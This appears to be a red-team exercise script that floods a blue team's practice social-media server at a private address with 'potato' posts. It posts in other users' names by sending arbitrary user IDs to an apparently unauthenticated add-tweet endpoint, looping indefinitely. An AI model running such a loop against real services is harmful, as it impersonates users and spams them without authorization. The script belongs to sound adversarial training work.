# Alex Rosse
# CDT Red Team
# Python Script to send post requests to add potato pics
# to blue team 2's web servers

import json
import requests
import time
import os

demourl = 'http://10.0.3.18:5000/tweet/add-tweet'

# Our Users
redTeamUsers = ['dlennon','mjvl','wDestler','hTubman123','JaneDoe','jbarrett01','johncena','lskywalker']

# Get Team 2 Users
demojson = open('demo.json',)
data = json.load(demojson)
demojson.close()
demo = []

for u in data['following']:
    if (u['username']) not in redTeamUsers:
        demo.append(u['id'])


# Words
words = open('potato.txt')
content = words.readlines()

counter = 0

# Go until the user interrupts
#
# Loop through all blue1 and blue2 users sending a tweet of
# the next potato in the folder 
#
# Will wait X seconds after each request to not DoS the website,
# just be to annoying
while(1):
    for u in demo:
        req = {"userId" : (f"{u}"), "text" : content[counter % len(content)]}
        res = requests.post(demourl, json = req)
        print(counter , res)
        counter += 1
        time.sleep(10)
